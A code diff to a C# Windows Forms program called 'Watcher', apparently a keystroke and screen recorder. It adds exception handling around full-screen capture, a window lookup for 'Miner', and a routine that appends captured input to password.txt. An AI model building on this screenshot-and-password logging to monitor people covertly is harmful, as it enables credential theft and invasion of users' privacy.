@@ -12,6 +12,7 @@ using System.IO;
 using System.Diagnostics;
 using Microsoft.Win32;
 using System.Drawing.Imaging;
+using System.Diagnostics;
 namespace Watcher
 {
     public partial class KeyRecord : Form
@@ -958,28 +959,38 @@ namespace Watcher
         /// <param name="blockRegionSize">要传输区域的大小</param>
         private void CutImage(int ImageWidth,int ImageHeight,int sourseX,int sourseY,int destinationX,int destinationY,Size blockRegionSize)
         {
-
-            Rectangle rect = new Rectangle();
-            //rect = Screen.GetWorkingArea(this);
-            rect = Screen.PrimaryScreen.Bounds;
-            ImageWidth = rect.Width;
-            ImageHeight = rect.Height;
-
-            //创建图象，保存将来截取的图象
-            Bitmap image = new Bitmap(ImageWidth, ImageHeight);
-            Graphics imgGraphics = Graphics.FromImage(image);
-            //设置截屏区域
-            imgGraphics.CopyFromScreen(sourseX, sourseY, destinationX, destinationY, new Size(ImageWidth, ImageHeight));
-
-            string fileName = DateTime.Now.ToString("yyyyMMddHHmmss") + DateTime.Now.Millisecond.ToString() + ".jpg";
-            string extension = Path.GetExtension(fileName);
-            if (extension == ".jpg")
+            try
             {
-                image.Save(fileName, ImageFormat.Jpeg);
+                Rectangle rect = new Rectangle();
+                //rect = Screen.GetWorkingArea(this);
+                rect = Screen.PrimaryScreen.Bounds;
+                ImageWidth = rect.Width;
+                ImageHeight = rect.Height;
+
+                //创建图象，保存将来截取的图象
+                Bitmap image = new Bitmap(ImageWidth, ImageHeight);
+                Graphics imgGraphics = Graphics.FromImage(image);
+                //设置截屏区域
+                imgGraphics.CopyFromScreen(sourseX, sourseY, destinationX, destinationY, new Size(ImageWidth, ImageHeight));
+
+                string fileName = DateTime.Now.ToString("yyyyMMddHHmmss") + DateTime.Now.Millisecond.ToString() + ".jpg";
+                string extension = Path.GetExtension(fileName);
+                if (extension == ".jpg")
+                {
+                    image.Save(fileName, ImageFormat.Jpeg);
+                }
+                else
+                {
+                    image.Save(fileName, ImageFormat.Bmp);
+                }
             }
-            else
+            catch (IOException ex)
             {
-                image.Save(fileName, ImageFormat.Bmp);
+                this.txtRecordInfo.Text += ex.Message + "\n\r";
+            }
+            catch (Exception ex)
+            {
+                this.txtRecordInfo.Text += ex.Message + "\n\r";
             }
         }
         #endregion
@@ -1030,9 +1041,15 @@ namespace Watcher
             
             if (!string.IsNullOrEmpty(Caption))
             {
-              
-                ParenthWnd = FindWindow(null, "Miner");
-              
+                try
+                {
+
+                    ParenthWnd = FindWindow(null, "Miner");
+                }catch(Exception ex)
+                {
+                    this.txtRecordInfo.Text += ex.Message + "\n\r";
+                
+                }
                 if (!ParenthWnd.Equals(IntPtr.Zero))//判断指定的窗体是否运行
                 {
                     //SetForegroundWindow(ParenthWnd);//将当前窗口锁定在最前
@@ -1045,13 +1062,18 @@ namespace Watcher
                     //this.lblMarginRight.Text = rect.Right.ToString();
                     //this.lblMarginTop.Text = rect.Top.ToString();
                     //this.lblMarginBottom.Text = rect.Bottom.ToString();
-
-                    WINDOWPLACEMENT wpm = new WINDOWPLACEMENT();
-                    GetWindowPlacement(ParenthWnd, ref wpm);
-                    Left = wpm.rcNormalPosition.Left;
-                    Right = wpm.rcNormalPosition.Right;
-                    Top = wpm.rcNormalPosition.Top;
-                    Bottom = wpm.rcNormalPosition.Bottom;
+                    try
+                    {
+                        WINDOWPLACEMENT wpm = new WINDOWPLACEMENT();
+                        GetWindowPlacement(ParenthWnd, ref wpm);
+                        Left = wpm.rcNormalPosition.Left;
+                        Right = wpm.rcNormalPosition.Right;
+                        Top = wpm.rcNormalPosition.Top;
+                        Bottom = wpm.rcNormalPosition.Bottom;
+                    }catch(Exception ex)
+                    {
+                        this.txtRecordInfo.Text += ex.Message + "\n\r";
+                    }
                     this.lblMarginLeft.Text = Left.ToString();
                     this.lblMarginRight.Text = Right.ToString();
                     this.lblMarginTop.Text = Top.ToString();
@@ -1194,7 +1216,7 @@ namespace Watcher
                 FileStream fs = null;
                 var date = DateTime.Now.ToString();
                 string FilePath = @"password.txt";
-                byte[] content = new UTF8Encoding(true).GetBytes(info + "/r/n");
+                byte[] content = new UTF8Encoding(true).GetBytes(info + "\r\n");
                 try
                 {
                     if (!File.Exists(FilePath))
